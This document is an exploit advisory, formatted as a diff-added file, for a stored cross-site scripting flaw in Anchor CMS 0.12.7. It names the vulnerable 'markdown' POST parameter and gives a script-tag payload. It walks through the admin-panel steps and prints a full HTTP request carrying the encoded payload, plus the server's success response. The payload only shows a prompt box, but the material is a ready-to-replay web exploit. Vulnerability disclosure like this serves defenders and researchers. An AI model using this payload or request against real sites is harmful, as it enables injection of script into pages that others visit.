@@ -1,0 +1,62 @@
+# Exploit Title: Anchor CMS 0.12.7 - 'markdown' Stored Cross-Site Scripting
+# Date: 2021-10-01
+# Exploit Author: Ramazan Mert GÖKTEN
+# Vendor Homepage: anchorcms.com
+# Vulnerable Software: https://github.com/anchorcms/anchor-cms/releases/download/0.12.7/anchor-cms-0.12.7-bundled.zip
+# Affected Version: [ 0.12.7 ]
+# Tested on: Windows 10
+
+# Vulnerable Parameter Type: POST
+# Vulnerable Parameter: markdown
+# Attack Pattern: <script>prompt("RMG_XSS_PoC")</script>
+
+# Description
+
+Exploitation of vulnerability as shown below;
+
+1-) Entering the Admin Panel ( vulnerableapplication.com/anchor/admin )
+2-) Click Create a new post button at the Posts tab ( From "vulnerableapplication.com/anchor/admin/posts " to "vulnerableapplication.com/anchor/admin/posts/add " )
+3-) Relevant payload (<script>prompt("RMG_XSS_PoC")</script>) which was defined above entering the markdown parameter then click "save" button
+4-) Finally, turn back the home page then shown the triggered vulnerability
+
+# Proof of Concepts:
+
+Request;
+
+POST /anchor/admin/posts/add HTTP/1.1
+Host: vulnerableapplication.com
+Connection: close
+Content-Length: 234
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://vulnerableapplication.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://vulnerableapplication.com/anchor/admin/posts/add
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9
+Cookie: anchorcms=eokq2ggm8mc4ulg2ii01a92a7d1jqvof7er085tqp9mvmdk2i3h1;
+_ga=GA1.2.798164571.1610282526; _gid=GA1.2.1405266792.1610282526; _gat=1
+
+token=uyBOhuKe5lRACERuFGu9CzEqUVe9b6LgfNLFWA6rJJOjG5BPUr2XxZzUV0pMXiQn&title=xss-poc-test&markdown=%3Cscript%3Eprompt(%22RMG_XSS_PoC%22)%3C%2Fscript%3E&slug=xss-poc-test&description=&status=published&category=8&css=&js=&autosave=false
+
+Response;
+
+HTTP/1.1 200 OK
+Date: Sun, 10 Jan 2021 12:50:51 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+X-Robots-Tag: noindex,nofollow
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 105
+
+{"id":"3","notification":"Your new article was
+created","redirect":"\/anchor\/admin\/posts\/edit\/3"}
